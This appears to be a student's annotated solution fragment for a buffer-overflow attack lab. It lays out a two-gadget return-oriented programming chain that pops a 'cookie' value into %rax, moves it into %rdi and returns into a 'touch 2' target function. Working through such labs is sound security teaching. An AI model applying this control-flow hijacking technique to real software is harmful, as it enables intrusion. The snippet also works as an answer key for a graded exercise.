// First gadget
popq %rax// the next 8 bytes must be the cookie value to save in %rax
ret // jump to the second gadget
// Second gadget
movq	%rax, %rdi // move cookie value to rdi
ret // jump to touch 2
